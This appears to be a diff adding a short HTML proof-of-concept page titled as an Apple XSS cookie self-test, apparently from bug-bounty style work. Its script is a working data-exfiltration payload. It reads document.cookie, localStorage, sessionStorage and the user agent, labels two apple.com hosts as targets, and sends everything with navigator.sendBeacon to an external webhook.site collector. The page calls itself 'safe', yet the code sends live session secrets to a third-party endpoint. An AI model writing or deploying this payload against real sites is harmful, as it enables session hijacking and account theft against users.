@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Apple XSS PoC – Real Cookie Self-Test</title>
+</head>
+<body>
+  <h2>Safe PoC – Capturing Real document.cookie from Current Session</h2>
+
+  <script>
+    // أهداف
+    var targets = [
+      "https://appstoreconnect.apple.com/",
+      "https://ma-gbitableauexternal-prod.apple.com/"
+    ];
+
+    // Webhook 
+    var webhook = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
+
+    // Real Data
+    var realCookies   = document.cookie;             
+    var realLS        = JSON.stringify(localStorage); // LocalStorage
+    var realSS        = JSON.stringify(sessionStorage); // SessionStorage
+    var userAgentInfo = navigator.userAgent;
+
+    // send one time each target
+    targets.forEach(function(target) {
+      var data = {
+        target: target,
+        cookies: realCookies,
+        localStorage: realLS,
+        sessionStorage: realSS,
+        userAgent: userAgentInfo
+      };
+
+      navigator.sendBeacon(webhook, JSON.stringify(data));
+      console.log("Real cookie exfiltrated for:", target);
+    });
+  </script>
+</body>
+</html>
